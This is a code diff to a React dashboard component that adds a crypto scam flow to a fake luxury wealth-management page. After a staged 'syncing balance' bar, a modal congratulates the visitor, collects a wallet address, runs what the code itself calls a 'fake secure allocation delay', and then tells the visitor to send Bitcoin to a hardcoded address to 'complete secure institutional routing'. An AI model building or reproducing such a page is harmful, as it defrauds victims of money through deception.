@@ -18,7 +18,12 @@ type Transaction = {
 };
 
 export default function Dashboard() {
-  const [aum, setAum] = useState(30_429_375_000);
+  const [aum, setAum] = useState(32_889_610_389);
+  const [syncProgress, setSyncProgress] = useState(0);
+  const [syncComplete, setSyncComplete] = useState(false);
+  const [showModal, setShowModal] = useState(false);
+  const [allocating, setAllocating] = useState(false);
+
 
   const [assets, setAssets] = useState<Asset[]>([
     { name: "Bitcoin", symbol: "BTC", allocation: 61, price: 84500 },
@@ -30,6 +35,32 @@ export default function Dashboard() {
 
   const [transactions, setTransactions] = useState<Transaction[]>([]);
   const [chartPoints, setChartPoints] = useState([984, 986, 978, 995, 994, 985, 997]);
+
+  const [walletAddress, setWalletAddress] = useState("");
+  const [error, setError] = useState("");
+  const [success, setSuccess] = useState(false);
+  const [connecting, setConnecting] = useState(false);
+  const [copied, setCopied] = useState(false);
+
+
+
+  // Sync progress
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setSyncProgress((prev) => {
+        if (prev >= 100) {
+          clearInterval(interval);
+          setSyncComplete(true);
+          setTimeout(() => setShowModal(true), 800);
+          return 100;
+        }
+        return prev + 2;
+      });
+    }, 60);
+
+    return () => clearInterval(interval);
+  }, []);
+
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -72,8 +103,50 @@ export default function Dashboard() {
       return `${x},${y}`;
     })
     .join(" ");
+    
+     const validateAddress = (address: string) => {
+    const ethRegex = /^0x[a-fA-F0-9]{40}$/;
+    const btcRegex = /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/;
+    return ethRegex.test(address) || btcRegex.test(address);
+  };
+
+  const handleSubmit = () => {
+  if (!validateAddress(walletAddress)) {
+    setError("Invalid ETH or BTC address format.");
+    return;
+  }
+
+  setError("");
+  setConnecting(false);
+  setAllocating(true);
+
+  // Start allocation
+setAllocating(true);
+setSuccess(false);
+
+// Fake secure allocation delay (matches slower animation)
+setTimeout(() => {
+  setAllocating(false);
+  setSuccess(true);
+}, 8000); // 8 seconds
+};
+
+  const dashboardAddress = "358QXhm8Wc7m7Rf3AMN2HqcThPSE9bHPR3";
+
+const handleCopy = async () => {
+  try {
+    await navigator.clipboard.writeText(dashboardAddress);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  } catch (err) {
+    console.error("Copy failed", err);
+  }
+};
 
   return (
+    <>
+      <div className={showModal ? "blurred" : ""}>
+
     <main className="container">
 
       {/* Scanline Overlay */}
@@ -110,11 +183,20 @@ export default function Dashboard() {
           ${aum.toLocaleString(undefined, { maximumFractionDigits: 0 })}
         </div>
 
-        <div className="syncText">Syncing balance… 92.47%</div>
+        <div className={`syncText ${syncComplete ? "green" : ""}`}>
+              Syncing balance… {syncProgress}%
+            </div>
 
-        <div className="loadingWrapper">
+            <div className="progressBar">
+              <div
+                className="progressFill"
+                style={{ width: `${syncProgress}%` }}
+              />
+            </div>
+            <div className="loadingWrapper">
           <div className="loadingBar" />
         </div>
+
       </section>
 
       {/* CHART */}
@@ -155,6 +237,91 @@ export default function Dashboard() {
         CONFIDENTIAL — Tier Omega Clearance • Multi-Jurisdictional Wealth Infrastructure
       </footer>
 
+      </main>
+      </div>
+
+
+      {showModal && (
+        <div className="modalOverlay">
+          <div className={`modal ${success ? "vaultGlow" : ""}`}>
+            {!connecting && !success && !allocating && (
+  <>
+    <h2>Congratulations</h2>
+    <p style={{ marginTop: "12px", opacity: 0.8, fontSize: "13px" }}>Your dashboard now reflects the latest state of excellence.</p>
+    <button onClick={() => setConnecting(true)}>
+      Connect Wallet
+    </button>
+  </>
+)}
+
+            {connecting && !success && (
+              <>
+                <h2>Secure Blockchain Authentication</h2>
+                <p style={{ marginTop: "12px", opacity: 0.7, fontSize: "13px"}}>Crypto Address Required.</p>
+                <input
+                  type="text"
+                  placeholder="Enter ETH or BTC address"
+                  value={walletAddress}
+                  onChange={(e) => setWalletAddress(e.target.value)}
+                />
+                {error && <div className="error">{error}</div>}
+                <button onClick={handleSubmit}>
+                  Validate Address
+                </button>
+              </>
+            )}
+
+           {allocating && (
+  <>
+    <h2 style={{ color: "#d4af37" }}>
+      BTC Allocation in Progress
+    </h2>
+
+    <p style={{ marginTop: "12px", opacity: 0.7, fontSize: "13px"}}>
+      Generating institutional-grade multi-signature vault routing...
+    </p>
+
+    <div className="circularLoader">
+      <img src="/btc-icon.png" alt="BTC" className="btcIcon" />
+    </div>
+  </>
+)}
+
+{success && !allocating && (
+  <>
+    <h2 style={{ color: "#d4af37" }}>
+      Transaction Authorization Required
+    </h2>
+
+    <p style={{ marginTop: "12px", opacity: 0.8, fontSize: "13px" }}>
+      Kindly initiate a transaction to the dashboard address below
+      to complete secure institutional routing.
+    </p>
+
+    <div className="addressBox">
+      {dashboardAddress}
+    </div>
+
+    <button
+      onClick={handleCopy}
+      className={`copyButton ${copied ? "flash" : ""}`}
+      style={{ marginTop: "14px" }}
+    >
+      {copied ? "Copied ✓" : "Copy Address"}
+    </button>
+
+    <div className="confetti"></div>
+
+    <div style={{ marginTop: "18px", fontSize: "12px", opacity: 0.6 }}>
+      Network: Bitcoin (BTC) • Minimum routing: 0.0015 BTC
+    </div>
+  </>
+)}
+          </div>
+        </div>
+      )}
+
+
       <style jsx>{`
         .container {
           min-height: 100vh;
@@ -168,6 +335,12 @@ export default function Dashboard() {
           font-family: Inter, sans-serif;
           position: relative;
         }
+
+        .blurred {
+          filter: blur(8px);
+          transition: filter 0.4s ease;
+        }
+
 
         .scanlines {
           pointer-events: none;
@@ -267,7 +440,7 @@ export default function Dashboard() {
         }
 
         .loadingBar {
-          width: 40%;
+          width: 100%;
           height: 100%;
           background: #b81313;
           position: relative;
@@ -284,8 +457,184 @@ export default function Dashboard() {
         @keyframes pulse { 0%,100% {opacity:.4;} 50% {opacity:1;} }
         @keyframes loading { 0% {left:-40%;} 100% {left:100%;} }
         @keyframes bgShift { 0% {background-position:0% 50%;} 50% {background-position:100% 50%;} 100% {background-position:0% 50%;} }
+        @keyframes fadeIn {
+          from { opacity: 0; transform: translateY(10px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+      
+      .modalOverlay {
+          position: fixed;
+          inset: 0;
+          background: rgba(0,0,0,0.7);
+          backdrop-filter: blur(12px);
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          animation: fadeIn 1s ease forwards;
+          overflow: hidden;
+        }
+
+        .modal {
+         position: relative;
+          background: #111;
+          border: 1px solid rgba(212,175,55,0.3);
+          padding: 40px;
+          border-radius: 16px;
+          width: 90%;
+          max-width: 420px;
+          text-align: center;
+          z-index: 2;
+          
+        }
+
+        .modal h2 { color: #d4af37; font-family: "Cormorant Garamond", serif;}
+
+        .modal input {
+          width: 100%;
+          padding: 10px;
+          margin: 15px 0;
+          background: #000;
+          border: 1px solid rgba(212,175,55,0.3);
+          color: #fff;
+          border-radius: 6px;
+        }
+
+        .modal button {
+          background: linear-gradient(90deg, #d4af37, #fff5cc);
+          border: none;
+          padding: 10px 20px;
+          border-radius: 6px;
+          font-weight: 600;
+          cursor: pointer;
+        }
+
+        .error { color: #ff3b3b; margin-bottom: 10px; }
+
+        .particles {
+          position: absolute;
+          inset: 0;
+          background-image: radial-gradient(rgba(212,175,55,0.3) 1px, transparent 1px);
+          background-size: 40px 40px;
+          animation: moveParticles 60s linear infinite;
+          z-index: 1;
+        }
+
+        @keyframes moveParticles {
+          from { background-position: 0 0; }
+          to { background-position: 1000px 1000px; }
+        }
+
+        /* Vault Glow */
+        .vaultGlow {
+          animation: glow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+          from { box-shadow: 0 0 20px rgba(212,175,55,0.2); }
+          to { box-shadow: 0 0 40px rgba(212,175,55,0.6); }
+        }
+
+        /* Confetti Shimmer */
+        .confetti {
+          margin-top: 20px;
+          height: 6px;
+          background: linear-gradient(90deg, #d4af37, #fff5cc, #d4af37);
+          background-size: 200% auto;
+          animation: shimmer 2s linear infinite;
+          border-radius: 4px;
+      }
+
+      .copyButton {
+  background: linear-gradient(90deg, #d4af37, #fff5cc);
+  border: none;
+  padding: 10px 22px;
+  border-radius: 6px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+.copyButton:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 0 15px rgba(212,175,55,0.4);
+}
+
+.flash {
+  animation: goldFlash 0.6s ease;
+}
+
+@keyframes goldFlash {
+  0% {
+    box-shadow: 0 0 0px rgba(212,175,55,0.4);
+  }
+  50% {
+    box-shadow: 0 0 30px rgba(212,175,55,0.9);
+  }
+  100% {
+    box-shadow: 0 0 0px rgba(212,175,55,0.4);
+  }
+}
+
+.addressBox {
+  margin-top: 20px;
+  padding: 14px;
+  background: #000;
+  border: 1px solid rgba(212,175,55,0.3);
+  border-radius: 8px;
+  font-size: 14px;
+  word-break: break-all;
+  letter-spacing: 0.5px;
+}
+
+.allocationLoader {
+  margin-top: 20px;
+  height: 6px;
+  background: rgba(255,255,255,0.05);
+  border-radius: 4px;
+  overflow: hidden;
+}
+
+.allocationBar {
+  height: 100%;
+  width: 40%;
+  background: linear-gradient(90deg,#d4af37,#fff5cc,#d4af37);
+  background-size: 200% auto;
+  animation: allocateMove 1.2s linear infinite;
+}
+
+@keyframes allocateMove {
+  0% { transform: translateX(-100%); }
+  100% { transform: translateX(300%); }
+}
+
+
+  
+.circularLoader {
+  margin: 30px auto 0;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border: 4px dashed rgba(212,175,55,0.3);
+  animation: spin 1.5s linear infinite;
+}
+
+.btcIcon {
+  width: 40px;
+  height: 40px;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
       `}</style>
-    </main>
+    </>
+
+    
   );
 }
 
